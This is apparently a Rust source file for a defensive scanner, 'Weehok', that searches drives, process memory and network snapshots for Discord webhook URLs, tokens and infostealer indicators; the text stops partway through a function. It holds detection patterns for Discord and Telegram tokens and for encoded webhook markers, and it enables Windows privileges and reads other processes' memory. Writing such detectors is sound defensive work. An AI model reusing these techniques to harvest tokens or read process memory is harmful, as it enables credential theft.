use aho_corasick::{AhoCorasick, AhoCorasickBuilder};
use anyhow::{Context, Result};
use base64::{Engine as _, engine::general_purpose};
use crossbeam_channel::{Receiver, Sender, bounded, unbounded};
use flate2::read::{GzDecoder, ZlibDecoder};
use regex::{Regex, bytes::Regex as BytesRegex};
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::{
    collections::HashSet,
    env,
    ffi::OsString,
    fs::{self, File, OpenOptions},
    io::{self, BufWriter, Cursor, Read, Write},
    path::{Path, PathBuf},
    process::{Command, Output, Stdio},
    sync::{
        Arc, LazyLock, Mutex,
        atomic::{AtomicBool, AtomicU64, Ordering},
    },
    thread,
    time::{Duration, Instant},
};
use walkdir::WalkDir;
use zip::ZipArchive;

#[cfg(windows)]
use std::{
    ffi::{OsStr, c_void},
    os::windows::ffi::OsStrExt,
    os::windows::fs::OpenOptionsExt,
    ptr,
};

#[cfg(windows)]
use windows_sys::Win32::{
    Foundation::{
        CloseHandle, ERROR_NOT_ALL_ASSIGNED, GetLastError, HANDLE, INVALID_HANDLE_VALUE, LUID,
    },
    Security::{
        AdjustTokenPrivileges, LUID_AND_ATTRIBUTES, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED,
        TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
    },
    Storage::FileSystem::{
        FILE_FLAG_BACKUP_SEMANTICS, FILE_FLAG_SEQUENTIAL_SCAN, FILE_SHARE_DELETE, FILE_SHARE_READ,
        FILE_SHARE_WRITE,
    },
    System::{
        Diagnostics::{
            Debug::ReadProcessMemory,
            ToolHelp::{
                CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
                TH32CS_SNAPPROCESS,
            },
        },
        Memory::{MEM_COMMIT, MEMORY_BASIC_INFORMATION, PAGE_GUARD, PAGE_NOACCESS, VirtualQueryEx},
        Threading::{
            GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
            PROCESS_VM_READ,
        },
    },
};

const DEFAULT_MAX_FILE_MB: u64 = 512;
const DEEP_DECODE_LIMIT: u64 = 32 * 1024 * 1024;
const STREAM_CHUNK_SIZE: usize = 1024 * 1024;
const STREAM_OVERLAP: usize = 8192;
const XOR_DECODE_RADIUS: usize = 8192;
const MEMORY_REGION_READ_LIMIT: usize = 2 * 1024 * 1024;
const MEMORY_PROCESS_READ_LIMIT: usize = 96 * 1024 * 1024;
const ARCHIVE_ENTRY_LIMIT: usize = 512;
const ARCHIVE_ENTRY_SCAN_LIMIT: usize = 32 * 1024 * 1024;
const ARCHIVE_TOTAL_SCAN_LIMIT: usize = 256 * 1024 * 1024;
const DECOMPRESS_SCAN_LIMIT: usize = 32 * 1024 * 1024;
const AMSI_SCAN_LIMIT: usize = 1024 * 1024;
const RUNTIME_COMMAND_TIMEOUT: Duration = Duration::from_secs(6);

static WEBHOOK_TEXT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)https?://(?:(?:canary|ptb)\.)?(?:discord(?:app)?\.com)/api(?:/v\d{1,2})?/webhooks/\d{16,22}/[A-Za-z0-9_\-]{30,180}",
    )
    .expect("valid webhook regex")
});

static WEBHOOK_BYTES_RE: LazyLock<BytesRegex> = LazyLock::new(|| {
    BytesRegex::new(
        r"(?i)https?://(?:(?:canary|ptb)\.)?(?:discord(?:app)?\.com)/api(?:/v\d{1,2})?/webhooks/\d{16,22}/[A-Za-z0-9_\-]{30,180}",
    )
    .expect("valid webhook bytes regex")
});

static PARTIAL_TEXT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)(?:https?://)?(?:(?:canary|ptb)\.)?(?:discord(?:app)?\.com)/api(?:/v\d{1,2})?/webhooks/\d{16,22}",
    )
    .expect("valid partial webhook regex")
});

static BASE64_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\b[A-Za-z0-9+/_-]{32,8192}={0,2}\b").expect("valid base64 regex")
});

static BASE32_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b[A-Z2-7]{32,8192}={0,6}\b").expect("valid base32 regex"));

static HEX_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\b[0-9a-f]{48,4096}\b").expect("valid hex regex"));
static NUMERIC_BYTE_ARRAY_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:0x[0-9a-f]{1,2}|\d{1,3})(?:\s*,\s*(?:0x[0-9a-f]{1,2}|\d{1,3})){15,}")
        .expect("valid numeric byte array regex")
});
static DISCORD_TOKEN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:mfa\.[A-Za-z0-9_\-]{20,}|[A-Za-z0-9_\-]{23,28}\.[A-Za-z0-9_\-]{6,12}\.[A-Za-z0-9_\-]{27,45})")
        .expect("valid discord token regex")
});
static TELEGRAM_BOT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\b\d{7,12}:[A-Za-z0-9_\-]{30,80}\b").expect("valid telegram bot token regex")
});

static HEX_BYTE_ESCAPE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\\x([0-9a-fA-F]{2})").expect("valid escape regex"));
static UNICODE_BRACE_ESCAPE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\\u\{([0-9a-fA-F]{1,6})\}").expect("valid escape regex"));
static UNICODE_ESCAPE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\\u([0-9a-fA-F]{4})").expect("valid escape regex"));
static URL_ESCAPE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"%([0-9a-fA-F]{2})").expect("valid url escape regex"));
static HTML_HEX_ESCAPE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"&#x([0-9a-fA-F]{2,6});").expect("valid html escape regex"));
static HTML_DEC_ESCAPE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"&#([0-9]{2,7});").expect("valid html escape regex"));
static HXXPS_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)hxxps://").expect("valid hxxps regex"));
static HXXP_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)hxxp://").expect("valid hxxp regex"));
static DOT_OBF_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:\[\s*\.\s*\]|\(\s*\.\s*\)|\{\s*\.\s*\}|\s+dot\s+)")
        .expect("valid dot obfuscation regex")
});
static SLASH_OBF_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:\[\s*/\s*\]|\(\s*/\s*\)|\{\s*/\s*\}|\s+slash\s+)")
        .expect("valid slash obfuscation regex")
});

static TEXT_SIGNAL_AC: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build([
            "discord",
            "discordapp",
            "webhook",
            "/api/webhooks/",
            "hxxp",
            "drocsid",
            "skoohbew",
            "qvfpbeq",
            "jroubbxf",
            "uggc",
            "\\u0064",
            "\\x68",
            "%68",
            "&#",
        ])
        .expect("valid text signal automaton")
});

static ENCODED_SIGNAL_AC: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build([
            "ZGlzY29y",                 // base64: discord
            "d2ViaG9v",                 // base64: webhoo
            "L2FwaS93ZWJob29rcy",       // base64: /api/webhooks
            "aHR0cHM6Ly9kaXNjb3Jk",     // base64: https://discord
            "646973636f7264",           // hex: discord
            "776562686f6f6b",           // hex: webhook
            "2f6170692f776562686f6f6b", // hex: /api/webhook
        ])
        .expect("valid encoded signal automaton")
});

static UTF16_SIGNAL_AC: LazyLock<AhoCorasick> = LazyLock::new(|| {
    let mut patterns = Vec::new();
    for marker in ["discord", "webhook", "/api/webhooks/", "hxxp"] {
        patterns.push(to_utf16_bytes(marker, true));
        patterns.push(to_utf16_bytes(marker, false));
    }

    AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build(patterns)
        .expect("valid utf16 signal automaton")
});

static XOR_MARKERS: [&[u8]; 4] = [
    b"discord.com",
    b"discordapp.com",
    b"/api/webhooks/",
    b"webhooks/",
];

static XOR_MARKER_AC: LazyLock<(AhoCorasick, Vec<u8>)> = LazyLock::new(|| {
    let mut keys = Vec::new();
    let mut patterns = Vec::new();

    for key in 1u8..=255 {
        for marker in XOR_MARKERS {
            keys.push(key);
            patterns.push(marker.iter().map(|byte| byte ^ key).collect::<Vec<u8>>());
        }
    }

    (
        AhoCorasick::new(patterns).expect("valid xor marker automaton"),
        keys,
    )
});

#[derive(Clone)]
struct Config {
    roots: Vec<PathBuf>,
    output: PathBuf,
    threads: usize,
    max_file_bytes: Option<u64>,
    reveal_secrets: bool,
    emit_secrets_to_ui: bool,
    scan_memory: bool,
    scan_network: bool,
}

#[derive(Default)]
struct Stats {
    queued: AtomicU64,
    scanned: AtomicU64,
    bytes: AtomicU64,
    findings: AtomicU64,
    skipped: AtomicU64,
    errors: AtomicU64,
    enumerating: AtomicBool,
}

#[derive(Clone, Serialize)]
struct FindingOutput {
    path: String,
    confidence: String,
    method: String,
    evidence: String,
    sha256: String,
    secret: Option<String>,
    source: String,
    threat_label: Option<String>,
    threat_score: u32,
    threat_reasons: Vec<String>,
}

#[derive(Clone, Serialize)]
struct ThreatOutput {
    path: String,
    source: String,
    label: String,
    score: u32,
    reasons: Vec<String>,
}

#[derive(Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum Event {
    Started {
        roots: Vec<String>,
        threads: usize,
        output: String,
        max_file_mb: Option<u64>,
    },
    Progress {
        queued: u64,
        scanned: u64,
        bytes: u64,
        findings: u64,
        skipped: u64,
        errors: u64,
        enumerating: bool,
    },
    Finding {
        finding: FindingOutput,
    },
    Log {
        level: String,
        message: String,
    },
    Finished {
        queued: u64,
        scanned: u64,
        bytes: u64,
        findings: u64,
        skipped: u64,
        errors: u64,
        output: String,
    },
    Fatal {
        message: String,
    },
}

#[derive(Clone)]
struct Candidate {
    value: String,
    method: String,
    confidence: &'static str,
}

#[derive(Clone)]
struct FileJob {
    path: PathBuf,
    len: u64,
}

#[derive(Default)]
struct ScanSignals {
    text: bool,
    encoded: bool,
    utf16: bool,
}

#[derive(Clone, Default)]
struct ThreatAssessment {
    score: u32,
    categories: u32,
    reasons: Vec<String>,
}

const CAT_WEBHOOK: u32 = 1 << 0;
const CAT_EXFIL: u32 = 1 << 1;
const CAT_BROWSER_STORE: u32 = 1 << 2;
const CAT_DECRYPT: u32 = 1 << 3;
const CAT_DISCORD_TOKEN: u32 = 1 << 4;
const CAT_WALLET: u32 = 1 << 5;
const CAT_RECON: u32 = 1 << 6;
const CAT_OBFUSCATION: u32 = 1 << 7;
const CAT_AV_DETECTED: u32 = 1 << 8;
const CAT_MESSAGING: u32 = 1 << 9;
const CAT_PASSWORD_MANAGER: u32 = 1 << 10;
const CAT_FTP_MAIL_VPN: u32 = 1 << 11;
const CAT_PAYMENT_AUTOFILL: u32 = 1 << 12;
const CAT_STAGING: u32 = 1 << 13;
const CAT_PERSISTENCE: u32 = 1 << 14;
const CAT_ANTI_ANALYSIS: u32 = 1 << 15;
const CAT_STEALER_FAMILY: u32 = 1 << 16;
const CAT_KEY_MATERIAL: u32 = 1 << 17;
const CAT_INPUT_CAPTURE: u32 = 1 << 18;
const CAT_REMEDIATION: u32 = 1 << 19;
const CAT_BENIGN_TERMINAL: u32 = 1 << 20;

fn main() {
    if let Err(error) = run() {
        let _ = emit_direct(Event::Fatal {
            message: format!("{error:#}"),
        });
        std::process::exit(1);
    }
}

fn run() -> Result<()> {
    let config = parse_args()?;
    if let Some(parent) = config.output.parent() {
        fs::create_dir_all(parent)
            .with_context(|| format!("create output folder {}", parent.display()))?;
    }

    let output_file = File::create(&config.output)
        .with_context(|| format!("create findings file {}", config.output.display()))?;
    let findings_writer = Arc::new(Mutex::new(BufWriter::new(output_file)));
    {
        let mut writer = findings_writer.lock().expect("findings lock");
        writeln!(writer, "Weehok findings.txt")?;
        writeln!(
            writer,
            "Secrets are redacted unless --unsafe-reveal-secrets is used."
        )?;
        writeln!(writer)?;
    }

    let (event_tx, event_rx) = unbounded::<Event>();
    let writer_handle = spawn_event_writer(event_rx);

    enable_deep_scan_privileges(&event_tx);

    let _ = event_tx.send(Event::Started {
        roots: config
            .roots
            .iter()
            .map(|root| root.display().to_string())
            .collect(),
        threads: config.threads,
        output: config.output.display().to_string(),
        max_file_mb: config.max_file_bytes.map(|bytes| bytes / 1024 / 1024),
    });

    let stats = Arc::new(Stats {
        enumerating: AtomicBool::new(true),
        ..Stats::default()
    });
    let done = Arc::new(AtomicBool::new(false));
    let progress_handle = spawn_progress_reporter(stats.clone(), done.clone(), event_tx.clone());

    let (file_tx, file_rx) = bounded::<FileJob>(config.threads.saturating_mul(32).max(64));
    let mut workers = Vec::with_capacity(config.threads);
    for _ in 0..config.threads {
        workers.push(spawn_worker(
            file_rx.clone(),
            stats.clone(),
            event_tx.clone(),
            findings_writer.clone(),
            config.clone(),
        ));
    }
    drop(file_rx);

    enumerate_files(&config.roots, &file_tx, &stats, &event_tx);
    stats.enumerating.store(false, Ordering::Relaxed);
    drop(file_tx);

    for worker in workers {
        let _ = worker.join();
    }

    if config.scan_memory {
        scan_process_memory(&config, &stats, &event_tx, &findings_writer);
    }

    if config.scan_network {
        scan_network_snapshot(&config, &stats, &event_tx, &findings_writer);
        scan_live_system_snapshots(&config, &stats, &event_tx, &findings_writer);
    }

    done.store(true, Ordering::Relaxed);
    let _ = progress_handle.join();

    {
        let mut writer = findings_writer.lock().expect("findings lock");
        writer.flush()?;
    }

    let _ = event_tx.send(Event::Finished {
        queued: stats.queued.load(Ordering::Relaxed),
        scanned: stats.scanned.load(Ordering::Relaxed),
        bytes: stats.bytes.load(Ordering::Relaxed),
        findings: stats.findings.load(Ordering::Relaxed),
        skipped: stats.skipped.load(Ordering::Relaxed),
        errors: stats.errors.load(Ordering::Relaxed),
        output: config.output.display().to_string(),
    });
    drop(event_tx);
    let _ = writer_handle.join();

    Ok(())
}

#[cfg(windows)]
fn enable_deep_scan_privileges(event_tx: &Sender<Event>) {
    let privileges = [
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeSecurityPrivilege",
    ];
    for privilege in privileges {
        match enable_privilege(privilege) {
            Ok(()) => {
                let _ = event_tx.send(Event::Log {
                    level: "info".to_string(),
                    message: format!("Enabled Windows privilege {privilege}."),
                });
            }
            Err(error) => {
                let _ = event_tx.send(Event::Log {
                    level: "warn".to_string(),
                    message: format!("Could not enable {privilege}: {error}."),
                });
            }
        }
    }
}

#[cfg(not(windows))]
fn enable_deep_scan_privileges(_event_tx: &Sender<Event>) {}

#[cfg(windows)]
type HamsiContext = *mut c_void;
#[cfg(windows)]
type HamsiSession = *mut c_void;

#[cfg(windows)]
#[link(name = "amsi")]
unsafe extern "system" {
    fn AmsiInitialize(app_name: *const u16, amsi_context: *mut HamsiContext) -> i32;
    fn AmsiScanBuffer(
        amsi_context: HamsiContext,
        buffer: *const c_void,
        length: u32,
        content_name: *const u16,
        amsi_session: HamsiSession,
        result: *mut u32,
    ) -> i32;
}

#[cfg(windows)]
static AMSI_CONTEXT: LazyLock<Option<usize>> = LazyLock::new(|| unsafe {
    let mut context: HamsiContext = ptr::null_mut();
    let app_name = to_wide_null("Weehok");
    if AmsiInitialize(app_name.as_ptr(), &mut context) >= 0 && !context.is_null() {
        Some(context as usize)
    } else {
        None
    }
});

#[cfg(windows)]
fn score_amsi_if_interesting(
    path: &Path,
    bytes: &[u8],
    source: &str,
    threat: &mut ThreatAssessment,
) {
    if source != "file" || is_deep_text_path(path) || detect_signals(bytes).text || threat.score > 0
    {
        score_amsi_buffer(&path.display().to_string(), bytes, threat);
    }
}

#[cfg(not(windows))]
fn score_amsi_if_interesting(
    _path: &Path,
    _bytes: &[u8],
    _source: &str,
    _threat: &mut ThreatAssessment,
) {
}

#[cfg(windows)]
fn score_amsi_buffer(content_name: &str, bytes: &[u8], threat: &mut ThreatAssessment) {
    if bytes.is_empty() || bytes.len() > AMSI_SCAN_LIMIT {
        return;
    }

    let Some(context) = *AMSI_CONTEXT else {
        return;
    };

    let content_name = to_wide_null(content_name);
    let mut result = 0u32;
    let hr = unsafe {
        AmsiScanBuffer(
            context as HamsiContext,
            bytes.as_ptr() as *const c_void,
            bytes.len() as u32,
            content_name.as_ptr(),
            ptr::null_mut(),
            &mut result,
        )
    };

    if hr >= 0 && (result >= 32768 || (16384..=20479).contains(&result)) {
        add_threat(
            threat,
            80,
            "AMSI provider flagged decoded or script content",
            CAT_AV_DETECTED | CAT_OBFUSCATION,
        );
    }
}

#[cfg(not(windows))]
fn score_amsi_buffer(_content_name: &str, _bytes: &[u8], _threat: &mut ThreatAssessment) {}

#[cfg(windows)]
fn enable_privilege(name: &str) -> io::Result<()> {
    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        ) == 0
        {
            return Err(io::Error::last_os_error());
        }

        let result = enable_privilege_with_token(token, name);
        let _ = CloseHandle(token);
        result
    }
}

#[cfg(windows)]
unsafe fn enable_privilege_with_token(token: HANDLE, name: &str) -> io::Result<()> {
    let wide = to_wide_null(name);
    let mut luid = LUID {
        LowPart: 0,
        HighPart: 0,
    };

    if unsafe { LookupPrivilegeValueW(ptr::null(), wide.as_ptr(), &mut luid) } == 0 {
        return Err(io::Error::last_os_error());
    }

    let mut privileges = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    if unsafe {
        AdjustTokenPrivileges(
            token,
            0,
            &mut privileges,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            ptr::null_mut(),
            ptr::null_mut(),
        )
    } == 0
    {
        return Err(io::Error::last_os_error());
    }

    let error = unsafe { GetLastError() };
    if error == ERROR_NOT_ALL_ASSIGNED {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "token does not hold this privilege",
        ));
    }

    Ok(())
}

#[cfg(windows)]
fn to_wide_null(value: &str) -> Vec<u16> {
    OsStr::new(value)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

fn parse_args() -> Result<Config> {
    let mut roots = Vec::new();
    let mut output = env::current_dir()?.join("findings.txt");
    let mut threads = default_thread_count();
    let mut max_file_bytes = Some(DEFAULT_MAX_FILE_MB * 1024 * 1024);
    let mut reveal_secrets = false;
    let mut emit_secrets_to_ui = false;
    let mut scan_memory = false;
    let mut scan_network = false;

    let args: Vec<OsString> = env::args_os().skip(1).collect();
    let mut index = 0usize;
    while index < args.len() {
        let arg = args[index].to_string_lossy();
        match arg.as_ref() {
            "--help" | "-h" => {
                print_help();
                std::process::exit(0);
            }
            "--all-drives" | "--json" => {}
            "--path" | "--root" => {
                index += 1;
                let value = args.get(index).context("--path requires a value")?;
                roots.push(PathBuf::from(value));
            }
            "--out" => {
                index += 1;
                let value = args.get(index).context("--out requires a value")?;
                output = PathBuf::from(value);
            }
            "--threads" => {
                index += 1;
                let value = args.get(index).context("--threads requires a value")?;
                threads = value
                    .to_string_lossy()
                    .parse::<usize>()
                    .context("parse --threads")?
                    .clamp(1, 32);
            }
            "--max-file-mb" => {
                index += 1;
                let value = args.get(index).context("--max-file-mb requires a value")?;
                let mb = value
                    .to_string_lossy()
                    .parse::<u64>()
                    .context("parse --max-file-mb")?;
                max_file_bytes = if mb == 0 {
                    None
                } else {
                    Some(mb.saturating_mul(1024 * 1024))
                };
            }
            "--unsafe-reveal-secrets" => {
                reveal_secrets = true;
            }
            "--emit-secrets-to-ui" => {
                emit_secrets_to_ui = true;
            }
            "--scan-memory" => {
                scan_memory = true;
            }
            "--scan-network" => {
                scan_network = true;
            }
            other => {
                if other.starts_with('-') {
                    anyhow::bail!("unknown argument {other}");
                }
                roots.push(PathBuf::from(&args[index]));
            }
        }
        index += 1;
    }

    if roots.is_empty() {
        roots = default_roots();
    }
    if roots.is_empty() {
        roots.push(env::current_dir()?);
    }

    Ok(Config {
        roots,
        output,
        threads,
        max_file_bytes,
        reveal_secrets,
        emit_secrets_to_ui,
        scan_memory,
        scan_network,
    })
}

fn print_help() {
    println!(
        "weehok-scanner --all-drives --out findings.txt [--threads N] [--max-file-mb N]\n\
         --path PATH can be used multiple times. --max-file-mb 0 disables the safety cap."
    );
}

fn default_thread_count() -> usize {
    num_cpus::get().saturating_sub(1).clamp(1, 6)
}

fn default_roots() -> Vec<PathBuf> {
    (b'A'..=b'Z')
        .filter_map(|letter| {
            let root = format!("{}:\\", letter as char);
            let path = PathBuf::from(root);
            if path.exists() { Some(path) } else { None }
        })
        .collect()
}

fn spawn_event_writer(rx: Receiver<Event>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let stdout = io::stdout();
        let mut writer = BufWriter::new(stdout.lock());
        for event in rx {
            if serde_json::to_writer(&mut writer, &event).is_ok() {
                let _ = writeln!(writer);
                let _ = writer.flush();
            }
        }
    })
}

fn emit_direct(event: Event) -> Result<()> {
    let stdout = io::stdout();
    let mut writer = BufWriter::new(stdout.lock());
    serde_json::to_writer(&mut writer, &event)?;
    writeln!(writer)?;
    writer.flush()?;
    Ok(())
}

fn spawn_progress_reporter(
    stats: Arc<Stats>,
    done: Arc<AtomicBool>,
    event_tx: Sender<Event>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        while !done.load(Ordering::Relaxed) {
            thread::sleep(Duration::from_millis(350));
            let _ = event_tx.send(progress_event(&stats));
        }
        let _ = event_tx.send(progress_event(&stats));
    })
}

fn progress_event(stats: &Stats) -> Event {
    Event::Progress {
        queued: stats.queued.load(Ordering::Relaxed),
        scanned: stats.scanned.load(Ordering::Relaxed),
        bytes: stats.bytes.load(Ordering::Relaxed),
        findings: stats.findings.load(Ordering::Relaxed),
        skipped: stats.skipped.load(Ordering::Relaxed),
        errors: stats.errors.load(Ordering::Relaxed),
        enumerating: stats.enumerating.load(Ordering::Relaxed),
    }
}

fn enumerate_files(
    roots: &[PathBuf],
    file_tx: &Sender<FileJob>,
    stats: &Stats,
    event_tx: &Sender<Event>,
) {
    for root in roots {
        let _ = event_tx.send(Event::Log {
            level: "info".to_string(),
            message: format!("Scanning root {}", root.display()),
        });

        let walker = WalkDir::new(root)
            .follow_links(false)
            .same_file_system(false)
            .into_iter();

        for entry in walker {
            match entry {
                Ok(entry) => {
                    if entry.file_type().is_file() {
                        let len = match entry.metadata() {
                            Ok(metadata) => metadata.len(),
                            Err(error) => {
                                let index = stats.errors.fetch_add(1, Ordering::Relaxed) + 1;
                                if index <= 80 {
                                    let _ = event_tx.send(Event::Log {
                                        level: "warn".to_string(),
                                        message: format!(
                                            "{}: cannot read metadata: {error}",
                                            entry.path().display()
                                        ),
                                    });
                                }
                                continue;
                            }
                        };
                        stats.queued.fetch_add(1, Ordering::Relaxed);
                        if file_tx
                            .send(FileJob {
                                path: entry.path().to_path_buf(),
                                len,
                            })
                            .is_err()
                        {
                            return;
                        }
                    }
                }
                Err(error) => {
                    if is_expected_locked_error(error.io_error()) {
                        stats.skipped.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }

                    let index = stats.errors.fetch_add(1, Ordering::Relaxed) + 1;
                    if index <= 80 {
                        let _ = event_tx.send(Event::Log {
                            level: "warn".to_string(),
                            message: format!("Cannot access entry: {error}"),
                        });
                    }
                }
            }
        }
    }
}

fn spawn_worker(
    file_rx: Receiver<FileJob>,
    stats: Arc<Stats>,
    event_tx: Sender<Event>,
    findings_writer: Arc<Mutex<BufWriter<File>>>,
    config: Config,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        while let Ok(job) = file_rx.recv() {
            match scan_file(&job, &config) {
                Ok((bytes, candidates, skipped, threat)) => {
                    if skipped {
                        stats.skipped.fetch_add(1, Ordering::Relaxed);
                    }
                    stats.bytes.fetch_add(bytes, Ordering::Relaxed);
                    if !candidates.is_empty() {
                        write_candidates(
                            &job.path,
                            candidates,
                            threat.as_ref(),
                            &stats,
                            &event_tx,
                            &findings_writer,
                            config.reveal_secrets,
                            config.emit_secrets_to_ui,
                        );
                    }
                }
                Err(error) => {
                    if is_expected_locked_error(error.downcast_ref::<io::Error>()) {
                        stats.skipped.fetch_add(1, Ordering::Relaxed);
                        stats.scanned.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }

                    let index = stats.errors.fetch_add(1, Ordering::Relaxed) + 1;
                    if index <= 80 {
                        let _ = event_tx.send(Event::Log {
                            level: "warn".to_string(),
                            message: format!("{}: {error:#}", job.path.display()),
                        });
                    }
                }
            }
            stats.scanned.fetch_add(1, Ordering::Relaxed);
        }
    })
}

#[cfg(windows)]
fn scan_process_memory(
    config: &Config,
    stats: &Stats,
    event_tx: &Sender<Event>,
    findings_writer: &Arc<Mutex<BufWriter<File>>>,
) {
    let _ = event_tx.send(Event::Log {
        level: "info".to_string(),
        message: "Scanning readable process memory windows.".to_string(),
    });

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            let _ = event_tx.send(Event::Log {
                level: "warn".to_string(),
                message: format!(
                    "Cannot create process snapshot: {}",
                    io::Error::last_os_error()
                ),
            });
            return;
        }

        let mut entry = std::mem::zeroed::<PROCESSENTRY32W>();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        let mut ok = Process32FirstW(snapshot, &mut entry) != 0;

        while ok {
            let pid = entry.th32ProcessID;
            let name = process_name(&entry);
            if pid > 4 {
                scan_single_process_memory(pid, &name, config, stats, event_tx, findings_writer);
            }
            ok = Process32NextW(snapshot, &mut entry) != 0;
        }

        let _ = CloseHandle(snapshot);
    }
}

#[cfg(not(windows))]
fn scan_process_memory(
    _config: &Config,
    _stats: &Stats,
    event_tx: &Sender<Event>,
    _findings_writer: &Arc<Mutex<BufWriter<File>>>,
) {
    let _ = event_tx.send(Event::Log {
        level: "warn".to_string(),
        message: "Process memory scanning is only implemented on Windows.".to_string(),
    });
}

#[cfg(windows)]
fn scan_single_process_memory(
    pid: u32,
    name: &str,
    config: &Config,
    stats: &Stats,
    event_tx: &Sender<Event>,
    findings_writer: &Arc<Mutex<BufWriter<File>>>,
) {
    unsafe {
        let process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid);
        if process.is_null() {
            return;
        }

        let mut address = 0usize;
        let mut total_read = 0usize;
        let mut candidates = Vec::new();
        let mut threat = ThreatAssessment::default();

        while total_read < MEMORY_PROCESS_READ_LIMIT {
            let mut info = std::mem::zeroed::<MEMORY_BASIC_INFORMATION>();
            let queried = VirtualQueryEx(
                process,
                address as *const _,
                &mut info,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );
            if queried == 0 {
                break;
            }

            let base = info.BaseAddress as usize;
            let region_size = info.RegionSize;
            let next = base.saturating_add(region_size);

            if info.State == MEM_COMMIT
                && (info.Protect & PAGE_GUARD) == 0
                && (info.Protect & PAGE_NOACCESS) == 0
            {
                let read_len = region_size
                    .min(MEMORY_REGION_READ_LIMIT)
                    .min(MEMORY_PROCESS_READ_LIMIT - total_read);
                if read_len >= 64 {
                    let mut buffer = vec![0u8; read_len];
                    let mut bytes_read = 0usize;
                    if ReadProcessMemory(
                        process,
                        base as *const _,
                        buffer.as_mut_ptr() as *mut _,
                        read_len,
                        &mut bytes_read,
                    ) != 0
                        && bytes_read > 0
                    {
                        buffer.truncate(bytes_read);
                        total_read = total_read.saturating_add(bytes_read);
                        let location = format!("memory://{pid}/{name}/0x{base:X}");
                        scan_small_content(Path::new(&location), &buffer, &mut candidates);
                        let chunk_threat =
                            assess_infostealer_bytes(Path::new(&location), &buffer, "memory");
                        merge_threat(&mut threat, chunk_threat);
                    }
                }
            }

            if next <= address {
                break;
            }
            address = next;
        }

        let _ = CloseHandle(process);

        if !candidates.is_empty() {
            dedupe_candidates(&mut candidates);
            let location = format!("memory://{pid}/{name}");
            let threat = threat_output(location.clone(), "memory", threat);
            write_candidates_for_location(
                &location,
                "memory",
                candidates,
                threat.as_ref(),
                stats,
                event_tx,
                findings_writer,
                config.reveal_secrets,
                config.emit_secrets_to_ui,
            );
        }
    }
}

#[cfg(windows)]
fn process_name(entry: &PROCESSENTRY32W) -> String {
    let end = entry
        .szExeFile
        .iter()
        .position(|value| *value == 0)
        .unwrap_or(entry.szExeFile.len());
    String::from_utf16_lossy(&entry.szExeFile[..end])
}

fn scan_network_snapshot(
    config: &Config,
    stats: &Stats,
    event_tx: &Sender<Event>,
    findings_writer: &Arc<Mutex<BufWriter<File>>>,
) {
    let _ = event_tx.send(Event::Log {
        level: "info".to_string(),
        message: "Scanning network, port, and DNS snapshots.".to_string(),
    });

    for (source, command, args) in [
        ("network", "netstat", vec!["-ano"]),
        (
            "listening-ports",
            "powershell",
            vec![
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "Get-NetTCPConnection -ErrorAction SilentlyContinue | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | ConvertTo-Csv -NoTypeInformation; Get-NetUDPEndpoint -ErrorAction SilentlyContinue | Select-Object LocalAddress,LocalPort,OwningProcess | ConvertTo-Csv -NoTypeInformation",
            ],
        ),
        ("dns-cache", "ipconfig", vec!["/displaydns"]),
        ("arp-cache", "arp", vec!["-a"]),
        ("route-table", "route", vec!["print"]),
    ] {
        scan_command_snapshot(
